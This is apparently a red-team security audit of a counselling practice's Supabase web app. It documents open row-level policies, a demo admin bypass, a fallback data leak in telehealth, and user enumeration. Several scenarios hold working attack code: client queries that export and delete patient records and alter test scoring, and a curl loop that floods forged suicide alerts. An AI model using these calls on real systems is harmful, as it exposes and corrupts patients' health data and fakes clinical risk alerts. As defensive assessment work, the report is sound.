# Phase 2: Hostile Red-Team Adversarial Exercises

**Reviewer:** Hostile Red-Team Specialist & Offensive Security Assessor  
**Artifact:** `./audit/90-redteam.md`  
**Target:** Local Development Environment / Static Analysis (Synthetic Data Only)

---

## Scenario 1: Anonymous Internet User with Public Anon Key

- **Attacker Goal:** Read, modify, and delete every database table; tamper with clinical psychometric definitions.
- **Preconditions:** Access to `NEXT_PUBLIC_SUPABASE_ANON_KEY` and `NEXT_PUBLIC_SUPABASE_URL` (accessible via browser inspector on any public page).
- **Execution Steps (Local Node/Console):**
  ```javascript
  import { createClient } from '@supabase/supabase-js';
  const client = createClient(URL, ANON_KEY);

  // 1. Exfiltrate all patient clinical notes
  const { data: notes } = await client.from('mmh_clinical_notes').select('*');
  // 2. Exfiltrate all patient intakes (addresses, medications, suicidality)
  const { data: intakes } = await client.from('mmh_client_intakes').select('*');
  // 3. Tamper with scoring rules on DASS-21
  await client.from('mmh_forms').update({ scoring_rules: { multiplier: 0 } }).eq('slug', 'dass-21');
  // 4. Delete real patient intake using the is_demo bypass
  await client.from('mmh_client_intakes').update({ is_demo: true }).eq('id', targetId);
  await client.from('mmh_client_intakes').delete().eq('id', targetId);
  ```
- **Expected Result (in a Secure System):** HTTP 401 Unauthorized / PostgreSQL Permission Denied (RLS policy violation).
- **Actual Result:** **Complete read, write, and deletion success.** All queries return HTTP 200 with complete records.
- **Evidence:** `supabase/schema.sql:140-169` configures `USING (true)` and `WITH CHECK (true)` on all tables.

---

## Scenario 2: Client A Reads or Alters Client B's Clinical Records

- **Attacker Goal:** Patient A accesses Patient B's appointment times, assigned screeners, invoices, or clinical history.
- **Execution Steps:**
  1. Patient A logs into `/portal`.
  2. Patient A opens developer tools or modifies the URL / input field to query:
     ```javascript
     const { data } = await supabase.from('mmh_form_assignments').select('*').eq('client_email', 'patient_b@example.com');
     ```
  3. Patient A inspects the returned JSON object containing Patient B's DASS-21 item-by-item answers and clinical severity.
- **Expected Result:** Query returns zero rows or RLS error.
- **Actual Result:** **Returns Patient B's full assessment answers and scores.** The email filter is applied only in client-side React code (`src/app/portal/page.tsx:162`), not enforced by PostgreSQL.

---

## Scenario 3: Privilege Escalation to Clinician Admin Console

- **Attacker Goal:** Unauthenticated visitor gains full access to Luke's clinician workbench.
- **Execution Path A (UI Bypass Button):**
  1. Attacker navigates to `http://localhost:3000/admin`.
  2. Attacker clicks *"Clinician Fast-Unlock (Demo Access)"*.
  3. Function `handleClinicianBypass()` (`src/app/admin/page.tsx:199`) sets in-memory state:
     ```typescript
     setSession({ user: { email: 'luke@mightymentalhealth.com.au', user_metadata: { role: 'clinician' } } });
     ```
  4. Dashboard calls `loadAllAdminData()` and renders the complete clinical schedule, client roster, and SOAP notes.
- **Execution Path B (Self-Registration via Magic Link):**
  1. Attacker enters their own external email address into the login form on `/admin`.
  2. Attacker receives Supabase magic link and authenticates.
  3. `checkAuth()` (`page.tsx:129-140`) verifies `if (existingSession) loadAllAdminData();`. Because there is **no check verifying whether `session.user.email` equals Luke Piatti's email**, the attacker is granted full admin access.
- **Evidence:** `src/app/admin/page.tsx:129-140` and `src/app/admin/page.tsx:199-209`.

---

## Scenario 4: Forging or Suppressing Clinical Risk Alerts

- **Attacker Goal:** Fabricate false suicide alerts or flood Luke's phone/inbox.
- **Execution Steps:**
  ```bash
  for i in {1..100}; do
    curl -X POST http://localhost:3000/api/alerts/clinician \
      -H "Content-Type: application/json" \
      -d '{
        "client_name": "Emergency Spoof",
        "client_email": "spoof@attack.com",
        "form_title": "PHQ-9",
        "severity": "🚨 URGENT Suicide Risk (Item 9 Flag)",
        "scores": { "hasSelfHarmRisk": true }
      }'
  done
  ```
- **Expected Result:** HTTP 401 Unauthorized (API key or session required); rate limiting (HTTP 429).
- **Actual Result:** HTTP 200 `{ "success": true, "alert_dispatched": true }`. Zero authentication, zero rate limiting, zero origin check.
- **Evidence:** `src/app/api/alerts/clinician/route.ts:3-73`.

---

## Scenario 5: Telehealth Eavesdropping & Client Data Leak via Fallback

- **Attacker Goal:** External visitor views another client's consultation notes via an invalid telehealth URL.
- **Execution Steps:**
  1. Attacker navigates to `http://localhost:3000/telehealth/invalid-random-uuid?role=clinician`.
  2. Database lookup for `invalid-random-uuid` returns null.
  3. Fallback code in `src/app/telehealth/[roomId]/page.tsx:191-199` fires:
     ```typescript
     const { data: defaultAppt } = await supabase
       .from('mmh_appointments')
       .select('*, service:mmh_services(*)')
       .order('scheduled_at', { ascending: false })
       .limit(1)
       .maybeSingle();
     ```
  4. The page displays the most recent client's name, email, phone, and clinical notes to the attacker.
- **Actual Result:** **Confirmed critical data leak.**
- **Evidence:** `src/app/telehealth/[roomId]/page.tsx:191-199`.

---

## Scenario 6: Abuse of Public API Routes & Webhook Reflection

- **Attacker Goal:** Abuse server-side endpoints to reflect PII or exploit SSRF.
- **Execution Steps:**
  Send POST to `http://localhost:3000/api/webhooks/intake` with malicious metadata payloads.
- **Observed Behavior:** Endpoint accepts unvalidated JSON, structures it into an internal object, and returns it directly in the JSON response (`route.ts:51-55`).
- **Evidence:** `src/app/api/webhooks/intake/route.ts:51-55`.

---

## Scenario 7: Domestic Abuser / Stalker Account Enumeration

- **Attacker Goal:** Determine whether an estranged partner is seeing Luke for counselling.
- **Execution Steps:**
  1. Attacker visits `http://localhost:3000/portal`.
  2. Attacker enters victim's email address into the lookup box.
  3. If victim is a client, the portal displays their upcoming appointment times and screener status.
- **Expected Result:** Opaque authentication barrier; no user enumeration.
- **Actual Result:** Immediate disclosure of appointment dates and clinical status.
- **Evidence:** `src/app/portal/page.tsx:162`.

---

## Scenario 8: Booking Abuse & Slot Hoarding

- **Attacker Goal:** Block all of Luke's clinical calendar availability.
- **Execution Steps:**
  Script automated POST requests inserting hundreds of appointments into `mmh_appointments` using the public anon key.
- **Expected Result:** Captcha enforcement, credit card pre-authorization, or server-side rate limits.
- **Actual Result:** Unconstrained database insertion allowed by `CREATE POLICY "Allow appointment booking" ON mmh_appointments FOR INSERT WITH CHECK (true);`.

---

## Scenario 9: 72-Hour Data Breach Tabletop

- **Scenario:** An attacker exfiltrates the entire Supabase database overnight.
- **What is Exposed?**
  1. Client names, emails, phones, residential addresses, dates of birth.
  2. Emergency contact names and phone numbers.
  3. Referring GP names, clinics, and phone numbers.
  4. Complete medication lists (e.g. Escitalopram 10mg) and medical histories.
  5. Psychiatric history and suicidal ideation answers.
  6. In-session SOAP clinical notes written by Luke.
  7. Form answers across 11 psychometric instruments.
- **How would the clinician know?**
  **Luke would not know.** There is no automated SIEM, no access anomaly alerting, and no query volume detection.
- **First 72-Hour Legal Obligations (Australian Law):**
  1. **Hour 0-24 (Containment):** Revoke anon key in Supabase dashboard. Drop all `USING (true)` RLS policies immediately.
  2. **Hour 24-48 (Assessment):** Under Section 26WH of the Privacy Act, an entity has 30 days to assess, but for health data, immediate containment is required. Determine exact number of compromised Australian individuals.
  3. **Hour 48-72 (Notification):** Submit formal Notifiable Data Breach statement to the OAIC (Office of the Australian Information Commissioner) via form `S26WK`. Notify all affected clients with recommended protective steps (IDCARE, password changes, support services).

---

## Scenario 10: "Where Am I Most Likely Wrong?"

*Assumptions the project owner is probably making that the technical evidence directly contradicts:*

1. **"Supabase has Row-Level Security enabled, so my data is secure."**  
   *Contradiction:* RLS is enabled on the tables, but every policy is written as `USING (true)`. A policy with `USING (true)` is the technical equivalent of having no security at all.
2. **"My client portal requires an email, so clients only see their own data."**  
   *Contradiction:* The email check is a superficial `filter()` in browser JavaScript. The underlying PostgREST database endpoint serves the entire database to anyone holding the public anon key.
3. **"My clinical notes are locked because there's a lock icon in the dashboard."**  
   *Contradiction:* The lock is a simple boolean flag in client state. The database has no trigger preventing updates or deletions of locked rows.
4. **"If a client expresses suicide risk on a screener, the system immediately alerts me."**  
   *Contradiction:* The alert is fired asynchronously by the client's browser *after* saving. If the client closes their tab or loses signal, no alert is sent. If `ANTIGRAVITY_MARKETING_WEBHOOK_URL` is empty, the server does nothing and reports success.
5. **"Luke can offer Medicare Mental Health Care Plan rebates because he holds a Master of Counselling from UQ."**  
   *Contradiction:* Australian Commonwealth law restricts Medicare Better Access rebates to Psychologists, Social Workers, and OTs. PACFA counsellors cannot claim Medicare rebates regardless of qualification level. Claiming Medicare re-referrals in GP letters is legally non-compliant.
